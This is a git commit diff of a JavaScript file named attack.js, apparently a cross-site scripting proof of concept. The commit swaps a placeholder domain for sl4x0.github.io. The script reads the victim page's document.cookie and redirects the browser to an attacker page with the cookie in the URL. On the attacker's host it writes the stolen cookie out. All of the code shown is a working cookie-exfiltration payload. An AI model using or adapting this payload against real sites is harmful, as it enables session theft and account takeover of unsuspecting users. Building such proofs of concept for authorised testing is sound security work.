2e2d8034ceb18a49cc8d979e82a6cc445a37c48f
Abdelrhman Allam <70459751+sl4x0@users.noreply.github.com>
2023-05-17 08:59:59 +0300

    Update attack.js

--- attack.js
+++ attack.js
@@ -1,9 +1,9 @@
-if (location.host === 'my_own_domain') {
+if (location.host === 'sl4x0.github.io') {
   const url = new URL(document.location);
   const parameters = new URLSearchParams(url.search);
   const cookie = parameters.get('cookie');
   document.write(cookie);
 } else {
   const cookie = document.cookie;
-  document.location = 'https://my_own_domain/attacker.html?cookie=' + cookie;
+  document.location = 'https://sl4x0.github.io/poc/attacker.html?cookie=' + cookie;
 }
